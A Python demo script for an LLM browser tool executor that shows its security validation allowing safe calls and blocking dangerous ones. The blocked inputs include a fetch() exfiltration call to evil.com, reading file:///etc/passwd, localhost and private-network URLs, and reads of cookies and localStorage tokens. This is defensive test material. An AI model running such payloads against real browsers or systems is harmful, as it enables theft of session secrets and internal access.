"""Browser Tool Security Demo.

This example demonstrates the security features of the browser tool executor.

Sprint 103 Feature 103.2: Browser security validation.
"""

import asyncio

from src.domains.llm_integration.tools.builtin.browser_executor import (
    browser_click,
    browser_evaluate,
    browser_navigate,
    browser_screenshot,
    close_browser,
)


async def demo_safe_operations():
    """Demonstrate safe browser operations."""
    print("=" * 80)
    print("SAFE BROWSER OPERATIONS")
    print("=" * 80)

    # Safe navigation
    print("\n1. Navigate to safe URL (https://example.com)")
    result = await browser_navigate("https://example.com")
    print(f"   Result: {result['success']}")
    print(f"   Title: {result.get('title', 'N/A')}")

    # Safe JavaScript evaluation
    print("\n2. Evaluate safe JavaScript (document.title)")
    result = await browser_evaluate("document.title")
    print(f"   Result: {result['success']}")
    print(f"   Value: {result.get('result', 'N/A')}")

    # Safe screenshot
    print("\n3. Take screenshot")
    result = await browser_screenshot(full_page=False)
    print(f"   Result: {result['success']}")
    if result.get("success"):
        print(f"   Screenshot size: {len(result.get('data', ''))} chars (base64)")


async def demo_blocked_operations():
    """Demonstrate blocked dangerous operations."""
    print("\n" + "=" * 80)
    print("BLOCKED DANGEROUS OPERATIONS")
    print("=" * 80)

    # Blocked: file:// URL
    print("\n1. Try to access local file (file:///etc/passwd)")
    result = await browser_navigate("file:///etc/passwd")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: localhost URL
    print("\n2. Try to access localhost (http://localhost:6379)")
    result = await browser_navigate("http://localhost:6379")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: private network URL
    print("\n3. Try to access private network (http://192.168.1.1)")
    result = await browser_navigate("http://192.168.1.1")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: fetch() call
    print("\n4. Try to execute fetch() (data exfiltration)")
    result = await browser_evaluate("fetch('https://evil.com/steal')")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: cookie access
    print("\n5. Try to access cookies (document.cookie)")
    result = await browser_evaluate("document.cookie")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: window.location manipulation
    print("\n6. Try to manipulate window.location")
    result = await browser_evaluate("window.location = 'https://evil.com'")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: eval() call
    print("\n7. Try to execute eval()")
    result = await browser_evaluate("eval('malicious code')")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: localStorage access
    print("\n8. Try to access localStorage")
    result = await browser_evaluate("localStorage.getItem('token')")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: empty selector
    print("\n9. Try to click with empty selector")
    result = await browser_click("")
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")

    # Blocked: too long selector
    print("\n10. Try to click with very long selector (>500 chars)")
    long_selector = "div " * 200
    result = await browser_click(long_selector)
    print(f"   Success: {result['success']}")
    print(f"   Error: {result.get('error', 'N/A')}")


async def main():
    """Run browser security demo."""
    print("\n")
    print("╔" + "=" * 78 + "╗")
    print("║" + " " * 18 + "BROWSER TOOL SECURITY DEMO" + " " * 34 + "║")
    print("║" + " " * 20 + "Sprint 103 Feature 103.2" + " " * 34 + "║")
    print("╚" + "=" * 78 + "╝")

    try:
        # Demo safe operations
        await demo_safe_operations()

        # Demo blocked operations
        await demo_blocked_operations()

    finally:
        # Cleanup
        print("\n" + "=" * 80)
        print("CLEANUP")
        print("=" * 80)
        await close_browser()
        print("\nBrowser closed successfully.")

    print("\n" + "=" * 80)
    print("SUMMARY")
    print("=" * 80)
    print("""
Security Features Demonstrated:
✓ URL Validation (blocks file://, localhost, private networks)
✓ JavaScript Validation (blocks fetch, cookies, eval, etc.)
✓ Selector Validation (empty, length limits)
✓ Safe operations work normally
✓ Dangerous operations blocked with clear error messages
""")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
